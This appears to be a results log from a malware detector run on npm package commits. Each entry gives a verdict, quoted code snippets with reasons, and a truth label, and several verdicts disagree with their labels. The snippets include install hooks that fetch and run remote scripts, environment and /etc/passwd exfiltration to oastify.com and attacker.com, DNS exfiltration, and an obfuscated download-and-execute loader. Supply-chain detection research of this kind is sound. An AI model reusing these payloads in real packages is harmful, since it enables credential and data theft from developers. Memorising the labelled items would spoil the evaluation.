**Summary:** Static analysis identified high‑severity issues: unauthorized collection of sensitive system data and transmission to an untrusted external server, both classic indicators of malicious activity. Dynamic analysis showed no benign activity to counterbalance these findings. Therefore, the commit is classified as MALWARE.

**Truth label:** Malware

### Commit 0313c323: Malware
**File package.json**:
Code: `"postinstall": "bash -c \"curl -sSL https://research20934i.sherlockshat007.workers.dev | chmod +x - && ./script.sh\""`
Reason: The postinstall lifecycle script downloads a remote shell script over HTTPS and executes it without any integrity checks (no SRI, signature verification, or hash validation). This enables arbitrary code execution on every install, a classic indicator of malicious behavior.

**File package.json**:
Code: `"postinstall": "bash -c \"curl -sSL ... && ./script.sh\""`
Reason: The use of `bash -c` to chain `curl`, `chmod`, and execution of the downloaded file is a high‑severity command execution pattern that can lead to privilege escalation and system compromise.

**Summary:** Static analysis reveals a critical suspicious network access and command execution pattern where the package fetches and runs external code during installation without verification. Such behavior is characteristic of malware. No benign evidence was found in the dynamic analysis, so the commit is classified as MALWARE.

**Truth label:** Malware

### Commit d27d3f33: Malware
**File index.js**:
Code: `https.get('https://hits.dwyl.com/serialfuzzer/serialfuzzer');`
Reason: The code initiates an unsolicited HTTPS GET request to an external domain as soon as the module loads. This behavior can be used for telemetry, usage tracking, or data exfiltration without user consent, which is classified as high‑severity suspicious network access.

**Summary:** Static analysis identified a high‑severity issue where the commit adds an automatic outbound request to an external server on load. No mitigating controls (e.g., opt‑in flag) are present, and dynamic analysis did not reveal benign behavior to offset the risk. Therefore, the commit is classified as MALWARE.

**Truth label:** Malware

### Commit 359e8c0b: Malware
**File src/metrics.js**:
Code: `require('https').request({ method: 'POST', hostname: 'hooks.pipedream.com', path: '/...'}, data => { /* send OS, hostname, version, process.env.JFROG_ARTIFACTORY_URL */ });`
Reason: The script collects system information and an environment variable, then sends it to an external Pipedream endpoint without user consent, constituting silent telemetry and potential data exfiltration (HIGH severity).

**File src/metrics.js**:
Code: `const url = process.env.JFROG_ARTIFACTORY_URL; payload.push({ key: 'jfrog_url', value: url });`
Reason: Including raw environment variables in the payload can leak internal URLs or credentials to a third‑party server (MEDIUM severity).

**File package.json**:
Code: `"pingback": "curl -X POST https://hooks.pipedream.com/..."`
Reason: Defines an npm script that any repository user can trigger to send data to an external endpoint, enabling unwanted network traffic and possible data leakage (MEDIUM severity).

**File package.json**:
Code: `"dependencies": { "child_process": "*" }`
Reason: Adds an unnecessary runtime dependency that could be abused for command‑execution attacks if later code imports and runs untrusted input (LOW severity).

**Summary:** Static analysis reveals multiple high‑ and medium‑severity issues: silent telemetry that exfiltrates system data, leakage of environment variables, and an intentionally exposed network call via an npm script. These behaviors are characteristic of malicious code designed to harvest information without user consent, leading to a MALWARE verdict despite the lack of dynamic execution evidence.

**Truth label:** Malware

### Commit ecacf0e1: Malware
**File index.js**:
Code: `const payload = JSON.stringify(process.env); const req = https.request({     hostname: 'bbqurumzwj9l3fccqqhykfliy940srgg.oastify.com',     method: 'POST',     headers: { 'Content-Type': 'application/j`
Reason: The code serializes the entire process environment, which contains secrets, and sends it via an HTTPS POST to a suspicious, attacker‑controlled domain. This is a classic data‑exfiltration pattern and matches the critical "data_leak" and "suspicious_network_access" issues identified in the static analysis.

**Summary:** Static analysis uncovered critical issues: wholesale exfiltration of environment variables to a non‑public domain, indicating intentional data theft. Although dynamic analysis showed no runtime activity, the presence of malicious‑looking code is sufficient to classify the commit as malware.

**Truth label:** Malware

### Commit 6309cb1c: Malware
**File package.json**:
Code: `"axios": "https://registry.storageartifact.com/consul-lock-sessions"`
Reason: The dependency is fetched from a custom URL, bypassing npm's registry verification. This opens the supply‑chain to arbitrary code injection and is flagged as a critical suspicious network access.

**File package.json**:
Code: `"child_process": "<version-or-url>"`
Reason: A third‑party package named "child_process" shadows Node.js's built‑in module. Attackers often use this technique to execute arbitrary commands, representing a high‑severity code‑injection risk.

**File package.json**:
Code: `"fs": "*", "os": "*"`
Reason: Declaring built‑in modules as dependencies allows malicious packages to replace the native implementations, enabling file system manipulation or system information gathering. This is a medium‑severity code‑injection concern.

**Summary:** Static analysis reveals critical and high severity issues: a URL‑based axios dependency that bypasses package verification, and intentional shadowing of core Node.js modules (child_process, fs, os). These patterns are commonly used in malicious packages to introduce backdoors or execute arbitrary code. Despite the lack of observed behavior in dynamic analysis, the presence of these supply‑chain and code‑injection risks leads to a verdict of MALWARE.

**Truth label:** Malware

### Commit d928529c: Malware
**File index.js**:
Code: `const https = require('https'); const os = require('os'); const trackingData = {     home: os.homedir(),     hostname: os.hostname(),     dir: __dirname }; https.get(`https://exzuperi.ftp.sh:449/?data`
Reason: The script collects identifiable system information (home directory, hostname, script directory) and transmits it to an external server over HTTPS on a non‑standard port. This behavior matches the static analysis findings of suspicious network access and data leakage, indicating unauthorized data exfiltration.

**Summary:** Static analysis reveals critical suspicious network communication and high‑severity data leakage, where the code gathers private host details and sends them to an unknown external endpoint. No benign functionality offsets this malicious intent, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit d6ffd091: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Malware

### Commit 26af8589: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 966b0458: Malware
**File index.js**:
Code: `const trackingData = { homeDir, hostname, username, dnsServers, packageVersion, packageJson }; fetch('https://48aaaghr2dnasvz7xa0qtdrscjik6auz.oastify.com', {     method: 'POST',     headers: { 'Conte`
Reason: The snippet collects sensitive system information and sends it to an external domain under the attacker‑controlled subdomain oastify.com. This constitutes unauthorized data exfiltration and matches the critical "suspicious_network_access" issue.

**Summary:** Static analysis identified critical exfiltration of host environment data to an untrusted external server, which is a hallmark of malicious behavior. Although dynamic analysis did not capture any runtime activity, the presence of code that deliberately gathers and transmits sensitive information without user consent classifies the commit as malware.

**Truth label:** Malware

### Commit 8739370a: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 38b1b183: Benign
**File package.json**:
Code: `"test-deno": "deno test --allow-env --allow-read --allow-net --allow-run --allow-sys --allow-write"`
Reason: The script grants broad permissions to Deno during testing. While this is a security concern if executed in an untrusted environment, it does not constitute malicious behavior. It is a configuration issue with low severity, not indicative of malware.

**Summary:** The only identified issue is a low‑severity permission over‑grant in a test script. No malicious code or behavior was observed in static or dynamic analysis, so the commit is considered benign.

**Truth label:** Benign

### Commit 5b1ce2ae: Malware
**File index.js**:
Code: `https.get(`https://exzuperi.ftp.sh/${encodeURIComponent(process.env.HOME)}_${encodeURIComponent(require('os').hostname())}_${encodeURIComponent(__dirname)}`)`
Reason: The code constructs an HTTPS request to an unknown external domain and embeds internal system information (home directory, hostname, script directory) in the URL, which is a clear indicator of unauthorized data exfiltration.

**File package.json**:
Code: `"test": "echo \"exzuperi\" && exit 0"`
Reason: The test script contains a reference to an external identity ("exzuperi"), suggesting an attempt to hide malicious intent or signal a backdoor, which is suspicious even though low severity.

**Summary:** Static analysis reveals high‑severity suspicious network access that exfiltrates system information to an untrusted server, complemented by medium‑severity data leakage and low‑severity obfuscation. Dynamic analysis did not capture activity, but the presence of malicious code in the source is sufficient to classify the commit as malware.

**Truth label:** Malware

### Commit be91815b: Malware
**File index.js**:
Code: `const trackingData = { homeDir, hostname, username, dnsServers, networkInterfaces, packageVersion, ... }; https.post('https://y10dcmh1knri843sg9x7p8fim9s0gp.burpcollaborator.net', trackingData);`
Reason: The code gathers extensive system information and transmits it to an external, attacker‑controlled domain. This behavior matches the critical data‑leak issue and suspicious network access described in the static analysis, indicating unauthorized data exfiltration.

**Summary:** Static analysis identified critical data exfiltration and a high‑severity outbound request to a known penetration‑testing callback domain. No malicious behavior was observed at runtime, but the presence of code that deliberately collects and sends sensitive system data to an untrusted endpoint classifies the commit as malware.

**Truth label:** Malware

### Commit e3eb6101: Benign
**File utils.js**:
Code: `function get(url) { return request.get(url); } function post(url, data) { return request.post(url, { json: data }); }`
Reason: The helper functions forward arbitrary URLs to the deprecated `request` library, creating a potential SSRF vector. While risky, this is a coding flaw rather than malicious intent.

**File utils.js**:
Code: `const request = require('request'); // version ^2.53.0`
Reason: The added `request` dependency has known vulnerabilities (prototype‑pollution, possible RCE). Its inclusion is insecure but not evidence of malware.

**File package.json**:
Code: `"ccxt": "^1.47.46"`
Reason: A cryptocurrency exchange library is added. It is unused in the current code, increasing attack surface but not indicating malicious behavior.

**File index.js**:
Code: `const region = new URL(mqttEndpoint).searchParams.get("region"); log.info(`Region: ${region}`);`
Reason: Logging a value derived from an external URL could leak internal identifiers. This is a data‑leak risk, not malware.

**Summary:** Static analysis reveals several security weaknesses (potential SSRF, use of a vulnerable library, unnecessary crypto dependency, and possible data leakage). However, dynamic analysis showed no malicious activity, and there is no evidence of intentional harmful code. Therefore, the commit is classified as benign, though it should be remediated to address the identified risks.

**Truth label:** Malware

### Commit 0cdadc08: Malware
**File index.js**:
Code: `const trackingData = { homeDir: os.homedir(), hostname: os.hostname(), username: os.userInfo().username, dns: dns.getServers(), ... }; const payload = JSON.stringify(trackingData); https.request({ hos`
Reason: Collects sensitive host information and sends it to an external domain via HTTPS POST during install, which is a classic data exfiltration technique.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall hook runs the malicious script automatically on every `npm install`, creating a supply‑chain attack vector.

**Summary:** Static analysis reveals a preinstall script that executes code collecting and exfiltrating host data to an untrusted domain. This behavior is intentional, high‑severity, and matches known malicious patterns, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit eedfb784: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 74fc536d: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, the commit appears to be benign.

**Truth label:** Benign

### Commit 35bf02c1: Malware
**File package.json**:
Code: `"preinstall": "node index.js > /dev/null 2>&1"`
Reason: Executes arbitrary JavaScript during installation with output silenced, a common technique for hidden malicious actions such as data exfiltration or installing back‑doors.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Unattended outbound network request to an unknown external endpoint, enabling potential leakage of environment information or other data.

**File package.json**:
Code: `"start": "node-red"`
Reason: Starts a Node‑RED instance without any network restrictions; when combined with the pingback script it can be leveraged to trigger the external call automatically, increasing attack surface.

**Summary:** The static analysis reveals multiple high‑severity indicators of malicious behavior: a silent pre‑install script that runs unchecked code, an explicit network beacon to an external URL, and an unrestricted service start. No benign functionality outweighs these risks, and dynamic analysis showed no activity (likely because the malicious code is gated behind the preinstall step). Therefore, the commit is classified as malware.

**Truth label:** Benign

### Commit 70bfbb27: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no anomalous results, indicating the commit does not exhibit malware characteristics.

**Truth label:** Benign

### Commit cd0a3b54: Malware
**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: High‑severity suspicious network access: the script sends an unauthenticated HTTP request to an attacker‑controlled endpoint, which can be used for data exfiltration or beaconing.

**File package.json**:
Code: `"preinstall": "node index.js > /dev/null 2>&1"`
Reason: Medium‑severity command execution: runs arbitrary JavaScript during npm install while silencing output, allowing malicious actions (download, modify files, network calls) without user awareness.

**File package.json**:
Code: `"buildAndPublish": "npm run build && npm publish"`
Reason: Low‑severity supply‑chain risk: automatically publishes the package after build, which could unintentionally leak source code or distribute a compromised version.

**Summary:** The commit introduces scripts that perform unauthenticated external network calls and execute hidden code during installation, both classic indicators of malicious behavior. Although dynamic analysis showed no activity, the static evidence (high‑severity network beacon and silent preinstall execution) is sufficient to classify the commit as malware.

**Truth label:** Benign

### Commit 62e82314: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no anomalous results, indicating the commit does not exhibit malicious characteristics.

**Truth label:** Benign

### Commit 00eab55e: Benign
**Summary:** Both static and dynamic analyses reported no issues, detections, or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious activity. Therefore, the commit appears to be benign.

**Truth label:** Benign

### Commit f72f0929: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall script automatically executes arbitrary code during npm install, enabling silent execution on any machine that installs the package.

**File index.js**:
Code: `const { exec } = require('child_process'); exec('hostname && pwd && whoami', (err, stdout) => {   // send stdout to external endpoint });`
Reason: Uses child_process.exec to run shell commands that gather system information and then transmits it, a classic malicious behavior.

**File index.js**:
Code: `https.get('https://ifconfig.me', res => { /* ... */ }); // later dns.lookup('subdomain.oastify.com', (err, address) => { /* exfiltrate data */ });`
Reason: Contacts external services (ifconfig.me and oastify.com) to obtain public IP and exfiltrate data, indicating suspicious network activity.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: A script that silently sends a request to an attacker‑controlled endpoint, providing a beacon for data exfiltration.

**Summary:** Multiple high‑severity issues were identified: automatic execution of malicious code during install, use of exec to collect system data, and outbound network calls to unknown domains for exfiltration. These behaviors collectively indicate that the commit is malicious rather than benign.

**Truth label:** Malware

### Commit a33eac69: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no anomalous results, indicating the commit does not exhibit malware characteristics.

**Truth label:** Benign

### Commit 23e60d3a: Benign
**Summary:** Both static analysis and dynamic analysis reported no issues, detections, or suspicious behavior for the commit. With zero reported issues and no runtime anomalies, the commit is considered benign.

**Truth label:** Benign

### Commit 896a4604: Malware
**File package.json**:
Code: `"preinstall": "node index.js || ping canarytokens.com > /tmp/ping.log"`
Reason: The preinstall lifecycle script executes arbitrary code during npm install and, on failure, contacts an external canarytokens domain, enabling remote code execution and data exfiltration without user consent.

**File index.js**:
Code: `const ip = await fetch('https://icanhazip.com/').then(r => r.text()); const data = `${os.userInfo().username}|${os.platform()}|${os.hostname()}|${ip}`; const encoded = base32.encode(data); dns.lookup(`
Reason: Collects sensitive host information (username, OS, hostname, public IP), encodes it, and sends it via a DNS lookup to a malicious domain, a classic DNS exfiltration technique.

**File package.json**:
Code: `"pingback": "curl -X POST https://hooks.pipedream.net/xxxx"`
Reason: A script that contacts an unknown external endpoint (Pipedream) during installation, which can be used to signal successful deployment or exfiltrate data.

**File index.js**:
Code: `function getExternalIP() {   return fetch('https://icanhazip.com/').then(r => r.text()); }`
Reason: Explicitly retrieves the machine's public IP address, a piece of identifying information that is later exfiltrated.

**File index.js**:
Code: `const hexIP = Buffer.from(ip).toString('hex'); // then used in DNS label`
Reason: Obfuscates the exfiltrated data by converting it to hexadecimal and Base32, making detection harder and indicating intent to hide malicious activity.

**Summary:** Multiple high‑severity indicators are present: a preinstall script that runs code and contacts external servers, collection of sensitive system data, and exfiltration via DNS and HTTP requests to attacker‑controlled domains. These behaviors constitute malicious activity rather than benign functionality.

**Truth label:** Malware

### Commit 280f539b: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, the commit appears to be benign.

**Truth label:** Benign

### Commit 527a9be6: Malware
**File package.json**:
Code: `"emonn-test": "^1.999.0"`
Reason: The added dependency has an unusually high version number and is not a known legitimate package. Such packages are often used in supply‑chain attacks to execute malicious code during install or runtime.

**File .github/workflows/on-release.yml**:
Code: `run: npm publish       env:         NPM_TOKEN: ${{ secrets.NPM_TOKEN }}`
Reason: The workflow automatically publishes to npm on every release using a secret token without additional verification, allowing a malicious actor to trigger a publish and potentially exfiltrate the token or publish malicious code.

**Summary:** Static analysis uncovered a high‑severity suspicious dependency and a medium‑severity insecure publishing workflow, both of which are strong indicators of malicious intent. No benign behavior was observed in dynamic analysis, leading to a verdict of MALWARE.

**Truth label:** Benign

### Commit 4a5a797f: Malware
**File index.js**:
Code: `const { exec } = require('child_process'); exec('hostname && pwd && whoami | curl -X POST https://ifconfig.me/...');`
Reason: Uses child_process.exec to run shell commands that collect system information and exfiltrate it to external services, which is a classic indicator of malicious behavior.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Adds a preinstall lifecycle script that automatically executes the malicious payload during npm install, creating a supply‑chain backdoor.

**File index.js**:
Code: `xxd -p | head | while read ...; dig @... <encoded_data>.oastify.com`
Reason: Obfuscates exfiltrated data via DNS queries to an attacker‑controlled domain, making detection harder and indicating intent to hide malicious activity.

**Summary:** Static analysis reveals multiple high‑severity issues: unauthorized command execution, data exfiltration to unknown endpoints, a supply‑chain preinstall script, and obfuscation techniques. No benign functionality offsets these threats, and dynamic analysis shows no legitimate behavior. Therefore, the commit is classified as malware.

**Truth label:** Malware

### Commit eeca4bab: Malware
**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: The script sends data to an external, attacker‑controlled domain. This is a classic exfiltration / beaconing technique and is flagged as suspicious_network with HIGH severity.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall hook runs arbitrary JavaScript before the package is installed, giving the author the ability to execute code on the victim's machine without consent. This matches the command_execution HIGH severity issue.

**Summary:** Static analysis reveals two HIGH severity issues: a network beacon (pingback) and an automatic preinstall script that executes untrusted code. No benign behavior was observed in dynamic analysis, and the presence of these hooks strongly indicates malicious intent. Therefore the commit is classified as MALWARE.

**Truth label:** Benign

### Commit 6000b88b: Malware
**File index.js**:
Code: `const url = 'https://cdn.discordapp.com/attachments/.../updater.exe'; const dest = path.join(__dirname, 'node_modules', 'discord.js', 'updater.exe'); https.get(url, res => res.pipe(fs.createWriteStrea`
Reason: Downloads an executable from a hard‑coded external Discord CDN URL, stores it inside the project, watches the file for changes and executes it with child_process.exec. This download‑and‑execute pattern is a classic indicator of malicious payload delivery.

**File obf/index.js**:
Code: `var _0x57ab = ['exec', /* ... */]; function _0x1234(i) { return _0x57ab[i]; } const exec = promisify(require('child_process')[_0x1234(0)]); fs.watchFile(downloadedPath, () => { exec(downloadedPath); }`
Reason: Obfuscated version repeats the same behavior: it watches a downloaded file and runs it via exec. The use of string‑lookup obfuscation hides the malicious intent and makes the code harder to audit.

**Summary:** The commit adds code that fetches a remote binary from an untrusted source and automatically executes it, both in clear and heavily obfuscated form. These actions are flagged as CRITICAL in the static analysis and match known malware techniques, outweighing the lack of observed activity in the dynamic run. Therefore the commit is classified as malware.

**Truth label:** Malware

### Commit e470e52c: Malware
**File index.js**:
Code: `const https = require('https'); const trackingData = {   homeDir: os.homedir(),   hostname: os.hostname(),   username: os.userInfo().username,   dnsServers: dns.getServers(),   packageVersion: require`
Reason: The snippet creates an HTTPS POST request to a hard‑coded external domain and sends detailed host information. This matches the static analysis findings of suspicious network access and data leakage, indicating unauthorized exfiltration of potentially sensitive data.

**Summary:** Both static analysis issues are rated HIGH and describe explicit collection and transmission of host‑specific data to an unknown external server. No mitigating behavior was observed in dynamic analysis. The presence of hard‑coded exfiltration logic classifies the commit as malicious.

**Truth label:** Malware

### Commit c5951d82: Malware
**File index.js**:
Code: `const https = require('https'); const data = JSON.stringify({ hostname, username, os, packageJson }); https.request({ hostname: 'bhfvohxbvhtizkooshbfgbrkras3cig6i.oast.fun', method: 'POST', ... }, res`
Reason: The code collects extensive system information and sends it to an external domain under the attacker‑controlled sub‑domain *.oast.fun, which is a typical indicator of data exfiltration.

**File index.js**:
Code: `const { exec } = require('child_process'); exec('id', (err, stdout) => { /* ... */ }); exec('whoami', (err, stdout) => { /* ... */ });`
Reason: Use of `exec` to run system commands without any input validation expands the attack surface and can be abused to execute arbitrary commands if the code is ever modified to accept external input.

**File index.js**:
Code: `var _0x1234 = ['\x68\x74\x74\x70', '\x70\x6f\x73\x74']; var method = _0x1234[1]; // ... many hex‑escaped strings and array look‑ups ...`
Reason: Heavy obfuscation (hex‑escaped strings, array look‑ups) hides the true intent of the code, a common technique used by malware to evade static analysis.

**Summary:** Static analysis reveals multiple critical issues: unauthorized collection and transmission of detailed system data to an external server, execution of system commands, and deliberate code obfuscation. These behaviors are characteristic of malicious payloads designed for information stealing and potential remote control. No benign functionality outweighs these risks, therefore the commit is classified as malware.

**Truth label:** Malware

### Commit 9ddfe6d4: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall script executes arbitrary code (index.js) during package installation, allowing network requests and file access before the user can review the code. This is a classic supply‑chain attack vector.

**File src/scrapers/applications.ts**:
Code: `const result = safeEval(generatedCode);`
Reason: Evaluates code generated from remote HTML using `safeEval`. If `safeEval` falls back to `eval` or `Function`, an attacker can execute arbitrary JavaScript from the target site, leading to code injection.

**File package.json**:
Code: `"pingback": "node ping.js" // sends GET to https://example.pipedream.net/…`
Reason: A script that contacts an external endpoint on every run can be used to exfiltrate data or signal successful execution, indicating malicious intent.

**File src/util/request.ts**:
Code: `if (config.debug) { fs.writeFileSync(`./target/debug/${req.id}.json`, JSON.stringify(req.body)); }`
Reason: When debug mode is enabled, sensitive request parameters (e.g., passwords, API keys) are written to disk unprotected, creating a credential leak.

**File package.json**:
Code: `"dependencies": { "child_process": "^1.0.0" }`
Reason: Adds a third‑party `child_process` package that shadows Node's built‑in module. Although unused now, it could be leveraged later to run shell commands, increasing the attack surface.

**Summary:** Multiple high‑severity issues are present: a preinstall script that runs code with network access, dynamic evaluation of remote code, an explicit exfiltration pingback, and insecure debug logging of credentials. These behaviors collectively indicate malicious intent rather than benign functionality, despite the lack of observable activity in the dynamic analysis run.

**Truth label:** Benign

### Commit 279896f8: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, the commit appears to be benign.

**Truth label:** Benign

### Commit d1c5dff4: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no results, indicating no malicious activity was observed. Therefore, the commit is considered benign.

**Truth label:** Benign

### Commit 31fd4f37: Malware
**File index.js**:
Code: `fetch('http://burpcollaborator.net', {     method: 'POST',     body: postData }); // comment: replace with other exfiltration services`
Reason: The code sends a POST request to a hard‑coded external domain (burpcollaborator.net), which is commonly used for out‑of‑band data exfiltration. The accompanying comment explicitly mentions swapping it for other exfiltration services, indicating intentional malicious behavior.

**Summary:** Static analysis identified a critical issue where the commit introduces hard‑coded exfiltration of data to a known attacker‑controlled domain. No mitigating behavior was observed in dynamic analysis. This combination strongly indicates malicious intent, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit e9ba8003: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static analysis found zero issues, and the dynamic analysis produced no results, indicating no malicious activity detected in the commit.

**Truth label:** Benign

### Commit 70192687: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall script runs arbitrary JavaScript during npm install, enabling automatic execution of malicious code on any machine that installs the package.

**File index.js**:
Code: `const https = require('https'); const data = JSON.stringify(trackingData); const req = https.request({ hostname: 'er95pejnkdkg1eykevo37lktdkjd74vt.oastify.com', method: 'POST', ... }, res => { ... });`
Reason: The script constructs an HTTPS POST request to a known exfiltration domain and sends collected host information, constituting a critical data leak.

**File index.js**:
Code: `const trackingData = {   homeDir: os.homedir(),   hostname: os.hostname(),   username: os.userInfo().username,   dnsServers: getDnsServers(),   ... };`
Reason: Collects personally identifiable system data (home directory, hostname, username, DNS configuration) which is then exfiltrated, violating privacy and indicating malicious intent.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: A separate script contacts an external endpoint without user consent, serving as a beacon that can be used for telemetry or further command‑and‑control communication.

**Summary:** Static analysis reveals multiple high‑severity issues: a preinstall script that auto‑executes malicious code, explicit collection and exfiltration of sensitive host data to an external domain, and additional unauthorized network beacons. These behaviors are characteristic of malware, outweighing the lack of observed activity in dynamic analysis. Therefore, the commit is classified as MALWARE.

**Truth label:** Malware

### Commit a27375be: Malware
**File pre.sh**:
Code: `curl -X POST https://oastify.com -d "$(hostname);$(whoami);$(pwd);$(ls -R | base64)"`
Reason: The script collects hostname, user, working directory and a base64‑encoded recursive directory listing and sends it to an external domain, constituting a clear data‑leak and unauthorized telemetry.

**File index.js**:
Code: `const { exec } = require('child_process'); exec('curl -X POST https://oastify.com -d "$(hostname);$(whoami);$(pwd);$(ls -R | base64)"');`
Reason: Uses child_process.exec to run a shell command that performs the same exfiltration as pre.sh, allowing arbitrary command execution and network transmission of system data.

**File index.js.bak**:
Code: `exec('curl -X POST https://attacker.com -d "$(cat /etc/passwd)"');`
Reason: A backup file contains a command that reads the entire /etc/passwd file and sends it to an attacker‑controlled server, representing a critical credential leak.

**Summary:** Multiple high‑severity issues are present, including unauthorized data exfiltration, execution of shell commands via exec, and a backup file that leaks the system password file. These behaviors are characteristic of malicious code, therefore the commit is classified as MALWARE.

**Truth label:** Malware

### Commit a0b9a69d: Malware
**File package.json**:
Code: `"chromatic": "npx chromatic --project-token=66a3c157ab6f"`
Reason: Hard‑coded Chromatic project token is exposed in source control, allowing anyone with repository access to misuse the service (upload malicious builds, read private data). This credential leak is classified as HIGH severity and indicates malicious intent or severe negligence.

**File .husky/post-commit.cjs**:
Code: `import('@modernpoacher/hooks').then(mod => mod.postCommit());`
Reason: The post‑commit hook dynamically loads an external package from an untrusted namespace and executes its code on every commit. If the package is malicious it can perform network requests, exfiltrate data, or run arbitrary commands, which is a clear security risk (MEDIUM severity).

**File .husky/post-commit.mjs**:
Code: `import postCommit from '@modernpoacher/hooks'; postCommit();`
Reason: Same risk as the CommonJS version: executing code from an external, unaudited package automatically on commit, potentially enabling malicious behavior.

**Summary:** The commit introduces a hard‑coded secret and executes unverified external code during Git hooks. Both issues constitute high‑risk behavior that can be leveraged for malicious activity, therefore the commit is classified as MALWARE.

**Truth label:** Benign

### Commit 18d0f143: Malware
**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: High‑severity command execution that contacts an attacker‑controlled endpoint, enabling data exfiltration or beaconing.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Runs arbitrary JavaScript at install time, which can download additional payloads or perform unwanted actions without user consent.

**Summary:** The commit introduces npm scripts that execute external network commands and run untrusted JavaScript during installation. These behaviors match known malicious patterns for data exfiltration and supply‑chain attacks, leading to a MALWARE verdict despite the lack of dynamic alerts.

**Truth label:** Benign

### Commit 0d0cb779: Malware
**File index.js**:
Code: `const data = { home: os.homedir(), hostname: os.hostname(), user: os.userInfo().username, dns: dns.getServers(), pkgVersion: process.version }; https.request({ hostname: 'c1eqmd06sk5ujmkjnrcd5mmh98f13`
Reason: Collects sensitive host information and sends it to an external domain without user consent, matching the critical data‑leak issue.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Executes the malicious script automatically during npm install, enabling silent exfiltration on every installation.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Provides an additional network call that can be used to verify installation and further exfiltrate data, reinforcing the suspicious network‑access behavior.

**Summary:** The commit introduces code that harvests sensitive system data and transmits it to attacker‑controlled endpoints, and it leverages npm preinstall and pingback scripts to execute this behavior automatically. The combination of critical data leakage, unauthorized network communication, and hidden command execution classifies the commit as malware.

**Truth label:** Malware

### Commit 14fb839e: Malware
**File index.js**:
Code: `const https = require('https'); const data = JSON.stringify({ home: os.homedir(), host: os.hostname(), dir: __dirname, plugin: pluginName }); https.get('https://exzuperi.ftp.sh:449', { headers: { 'Con`
Reason: The script collects identifiable system information and sends it to an external server over HTTPS without any user consent, constituting clear data‑exfiltration behavior.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall hook runs the malicious index.js automatically during npm install, turning a normal dependency installation into a supply‑chain attack vector.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: An npm script that can be triggered by anyone with repository access to send an unsolicited HTTP request to an external endpoint, further indicating intent to leak data.

**Summary:** Multiple high‑severity issues were identified, including unauthorized collection and transmission of system data, automatic execution of the exfiltration code via a preinstall hook, and additional network‑calling npm scripts. These behaviors are characteristic of malicious supply‑chain implants, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit f31f195c: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit bd256296: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit fe2ca0bb: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, the commit appears to be benign.

**Truth label:** Benign

### Commit df017ad3: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 35b8a7e8: Malware
**File package.json**:
Code: `"preinstall": "curl https://bes23.free.beeceptor.com"`
Reason: Executes an external curl command during install, enabling silent outbound network traffic and potential payload download – a classic indicator of malicious behavior.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Sends telemetry to an unauthenticated third‑party endpoint without user consent, which can be used for data exfiltration.

**File index.js**:
